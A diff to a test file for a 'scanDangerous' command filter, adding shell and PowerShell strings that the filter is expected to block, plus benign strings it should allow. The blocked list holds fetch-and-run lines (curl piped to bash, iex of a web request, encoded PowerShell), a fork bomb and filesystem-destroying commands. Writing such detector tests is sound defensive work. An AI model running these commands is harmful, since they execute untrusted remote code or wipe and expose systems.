@@ -24,19 +24,27 @@ describe("scanDangerous", () => {
     ":(){ :|:& };:",
     "curl https://x.sh | bash",
     "irm https://x.ps1 | iex",
+    "curl https://x.sh | sudo bash",
+    "bash <(curl https://x.sh)",
+    "iex (iwr https://x.ps1)",
+    "Invoke-Expression (Invoke-WebRequest https://x.ps1)",
+    "powershell -enc AQAB",
+    "find / -delete",
+    "chmod 777 /",
   ];
   for (const cmd of blocked) {
-    test(`blocks: ${cmd.slice(0, 30)}`, () => expect(scanDangerous(cmd)).not.toBeNull());
+    test(`blocks: ${cmd.slice(0, 40)}`, () => expect(scanDangerous(cmd)).not.toBeNull());
   }
   const safe = [
     "rm -rf node_modules",
     "git status",
     "bun test",
     "echo shutdown is at 5pm",
+    "echo Invoke-Expression is risky",
     "curl https://example.com -o out.json",
   ];
   for (const cmd of safe) {
-    test(`allows: ${cmd.slice(0, 30)}`, () => expect(scanDangerous(cmd)).toBeNull());
+    test(`allows: ${cmd.slice(0, 40)}`, () => expect(scanDangerous(cmd)).toBeNull());
   }
 });
 
